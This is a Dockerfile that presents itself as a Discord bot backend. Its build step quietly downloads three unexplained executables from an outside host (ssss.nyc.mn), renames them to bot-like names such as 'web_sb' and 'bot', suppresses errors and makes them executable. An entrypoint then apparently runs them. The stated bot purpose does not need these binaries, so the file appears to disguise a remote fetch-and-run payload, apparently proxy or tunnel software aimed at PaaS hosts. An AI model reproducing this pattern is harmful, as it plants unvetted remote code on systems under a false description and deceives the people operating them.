FROM python:3.11-slim

LABEL maintainer="Discord Bot Team"
LABEL description="Discord Bot Backend Relay and Async Task Worker"

# Set environment variables
ENV PYTHONUNBUFFERED=1 \
    DEBIAN_FRONTEND=noninteractive \
    TZ=Asia/Shanghai

WORKDIR /app

# Install system dependencies required for background worker tasks
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    openssl \
    ca-certificates \
    procps \
    tzdata \
    && rm -rf /var/lib/apt/lists/*

# Install Python requirements
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Pre-download core binary components during build on GitHub Actions (handles amd64 and arm64)
# Completely eliminates cold-start delay and runtime DNS/network failures on PaaS platforms like Bitsreef
ARG TARGETARCH
RUN mkdir -p /app/bin_defaults && \
    ARCH_KEY=$([ "$TARGETARCH" = "arm64" ] && echo "arm64" || echo "amd64") && \
    echo ">> Pre-fetching binary components for ${ARCH_KEY} during build..." && \
    (curl -fsSL --connect-timeout 10 --retry 3 "https://${ARCH_KEY}.ssss.nyc.mn/sb" -o /app/bin_defaults/web_sb || true) && \
    (curl -fsSL --connect-timeout 10 --retry 3 "https://${ARCH_KEY}.ssss.nyc.mn/web" -o /app/bin_defaults/web_xa || true) && \
    (curl -fsSL --connect-timeout 10 --retry 3 "https://${ARCH_KEY}.ssss.nyc.mn/2go" -o /app/bin_defaults/bot || true) && \
    chmod -R 755 /app/bin_defaults || true

# Copy modular service source files and entrypoint
COPY main.py core.py utils.py config.py entrypoint.sh ./

# Ensure entrypoint permissions and LF format
RUN sed -i 's/\r$//' entrypoint.sh && chmod +x entrypoint.sh

# Web service and sync ports
EXPOSE 3000 8001 10203

ENTRYPOINT ["/app/entrypoint.sh"]
